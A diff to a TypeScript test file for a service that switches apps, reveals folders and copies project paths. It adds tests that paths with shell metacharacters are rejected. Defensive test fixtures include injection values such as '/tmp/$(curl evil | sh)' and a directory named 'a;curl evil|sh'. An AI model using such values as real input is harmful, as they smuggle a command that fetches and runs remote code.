@@ -6,6 +6,7 @@ import test from 'node:test'
 import type { AgentStatusEvent } from '../src/types/agent.ts'
 import {
   activateMacBundle,
+  isShellSafePath,
   isUsableProjectPath,
   SessionJumpService,
   sessionJumpKey,
@@ -39,7 +40,7 @@ function harness(overrides: Partial<SessionJumpDependencies> = {}) {
     now: () => now,
     getPreferences: () => preferences,
     activateBundle: async bundleId => { calls.push(['activate', bundleId]) },
-    openDirectory: async directory => { calls.push(['open', directory]); return '' },
+    revealDirectory: directory => { calls.push(['reveal', directory]) },
     writeClipboard: text => { calls.push(['clipboard', text]) },
     ...realFs,
     ...overrides,
@@ -93,7 +94,7 @@ test('switch to app is unsupported off macOS and follows both toggles', async ()
   assert.deepEqual(calls, [])
 })
 
-test('open folder only opens an existing, non-bundle directory (resolved through links)', { skip: process.platform === 'win32' }, async t => {
+test('show folder only reveals an existing, non-bundle directory (resolved through links)', { skip: process.platform === 'win32' }, async t => {
   const root = tempRoot(t)
   const project = path.join(root, 'my-app')
   fs.mkdirSync(project)
@@ -122,11 +123,32 @@ test('open folder only opens an existing, non-bundle directory (resolved through
   for (const [id, projectPath, opens] of cases) {
     advance(10_001) // stay under the per-action rate limit
     service.record(event({ sessionId: id }), { projectPath })
-    const result = await service.run('open-folder', sessionJumpKey('claude', id))
+    const result = await service.run('show-folder', sessionJumpKey('claude', id))
     assert.deepEqual(result, opens ? { ok: true } : { ok: false, error: 'unavailable' }, id)
   }
   const realProject = fs.realpathSync(project)
-  assert.deepEqual(calls, [['open', realProject], ['open', realProject]])
+  assert.deepEqual(calls, [['reveal', realProject], ['reveal', realProject]])
+})
+
+test('a document package folder is only revealed, never handed to its app', { skip: process.platform === 'win32' }, async t => {
+  // LaunchServices would open x.xcodeproj in Xcode; the service has no "open" dependency at all.
+  const root = tempRoot(t)
+  const xcodeproj = path.join(root, 'x.xcodeproj')
+  fs.mkdirSync(xcodeproj)
+  const { service, calls } = harness()
+  service.record(event(), { projectPath: xcodeproj })
+  assert.deepEqual(await service.run('show-folder', KEY), { ok: true })
+  assert.deepEqual(calls, [['reveal', fs.realpathSync(xcodeproj)]])
+})
+
+test('shell metacharacters make a path unsafe to paste', () => {
+  for (const bad of ['/tmp/a;b', '/tmp/a|b', '/tmp/a&b', '/tmp/$HOME', '/tmp/`x`', '/tmp/a>b', '/tmp/(x)', '/tmp/{x}', '/tmp/*', '/tmp/a?', '/tmp/a!', '/tmp/"x"', "/tmp/'x'", '/tmp/a\\b', '/tmp/a\nb']) {
+    assert.equal(isShellSafePath(bad, 'darwin'), false, bad)
+  }
+  assert.equal(isShellSafePath('/Users/me/work/my-app_v2.0 copy', 'darwin'), true)
+  assert.equal(isShellSafePath('C:\\work\\repo', 'win32'), true)
+  assert.equal(isShellSafePath('C:\\work\\%PATH%', 'win32'), false)
+  assert.equal(isShellSafePath('C:\\work\\a^b', 'win32'), false)
 })
 
 test('a relative, control-character or UNC path is never used', async () => {
@@ -166,8 +188,10 @@ test('copy path copies the reported path of an existing directory and keeps it a
   assert.deepEqual(await service.run('copy-path', KEY), { ok: true })
   assert.deepEqual(calls, [['clipboard', project]])
 
-  // A forged path that is not a real directory never reaches the clipboard.
-  service.record(event({ sessionId: 'forged' }), { projectPath: '/tmp/$(curl evil | sh)' })
+  // Shell metacharacters never reach the clipboard, even when such a directory really exists.
+  const forged = path.join(root, 'a;curl evil|sh')
+  fs.mkdirSync(forged)
+  service.record(event({ sessionId: 'forged' }), { projectPath: forged })
   assert.deepEqual(await service.run('copy-path', sessionJumpKey('claude', 'forged')), { ok: false, error: 'unavailable' })
   assert.equal(calls.length, 1)
 })
@@ -194,11 +218,11 @@ test('actions are rate limited per action and unknown, offline or stale sessions
 test('launcher and directory failures are reported, not thrown', { skip: process.platform === 'win32' }, async () => {
   const { service } = harness({
     activateBundle: async () => { throw new Error('Unable to find application') },
-    openDirectory: async () => 'Failed to open',
+    revealDirectory: () => { throw new Error('Failed to reveal') },
   })
   service.record(event(), { projectPath: os.tmpdir() })
   assert.deepEqual(await service.run('switch-app', KEY), { ok: false, error: 'failed' })
-  assert.deepEqual(await service.run('open-folder', KEY), { ok: false, error: 'failed' })
+  assert.deepEqual(await service.run('show-folder', KEY), { ok: false, error: 'failed' })
 })
 
 test('activateMacBundle runs /usr/bin/open -b without a shell and rejects anything else', async () => {
